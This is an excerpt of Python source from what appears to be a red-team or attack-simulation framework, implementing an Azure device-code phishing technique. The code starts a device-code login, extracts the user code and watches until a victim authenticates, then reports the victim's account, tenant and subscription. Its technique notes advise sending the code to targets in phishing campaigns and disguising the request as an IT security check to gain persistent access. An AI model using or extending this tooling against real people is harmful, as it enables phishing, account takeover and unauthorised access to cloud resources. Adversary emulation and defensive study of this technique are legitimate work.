...
def monitor_device_code_authentication(az_command, device_code_data, timeout_seconds):
    ...
    print(
        f"[AzureEstablishAccessViaDeviceCode] Starting authentication monitoring for device code: {device_code_data.get('user_code', 'Unknown')}"
    )
        ...
        try:
            ...
            if result.returncode == 0:
                ...
                try:
                    ...
                    print(
                        f"[AzureEstablishAccessViaDeviceCode] Authentication successful for user: {account_info.get('user', {}).get('name', 'Unknown')}"
                    )
                    print(
                        f"[AzureEstablishAccessViaDeviceCode] Tenant: {account_info.get('tenantId', 'Unknown')}"
                    )
                    print(
                        f"[AzureEstablishAccessViaDeviceCode] Subscription: {account_info.get('name', 'Unknown')}"
                    )
                    return True
                except json.JSONDecodeError:
                    print(
                        "[AzureEstablishAccessViaDeviceCode] Authentication successful (could not parse account details)"
                    )
                    return True
    ...
    print(
        f"[AzureEstablishAccessViaDeviceCode] Authentication monitoring timed out after {timeout_seconds} seconds"
    )
    return False
...
class AzureEstablishAccessViaDeviceCode(BaseTechnique):
    def __init__(self):
        ...
        technique_notes = [
            TechniqueNote(
                "This technique requires the target user to manually complete the device code authentication flow using the provided URL and code"
            ),
            TechniqueNote(
                "The device code remains valid for approximately 15 minutes by default, providing a reasonable window for user interaction"
            ),
            TechniqueNote(
                "Use this technique in phishing campaigns by sending the device code URL and user code to target users via email or messaging"
            ),
            TechniqueNote(
                "Monitor the authentication status using the built-in background process - successful authentication will be detected automatically"
            ),
            TechniqueNote(
                "The technique establishes persistent access to Azure resources through the Azure CLI authentication token"
            ),
            TechniqueNote(
                "Combine with social engineering to increase success rate - present the authentication request as a legitimate IT security verification"
            ),
            TechniqueNote(
                "Once authenticated, the session persists until explicit logout or token expiration"
            ),
        ]
    ...
    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        ...
        try:
            ...
            ):  # Wait max 10 seconds for device code info
                try:
                    ...
                    if line:
                        ...
                        device_code_match = re.search(
                            device_code_pattern, line, re.IGNORECASE
                        )
            ...
            if not device_code_info and output_lines:
                ...
                device_code_match = re.search(
                    device_code_pattern, full_output, re.IGNORECASE
                )
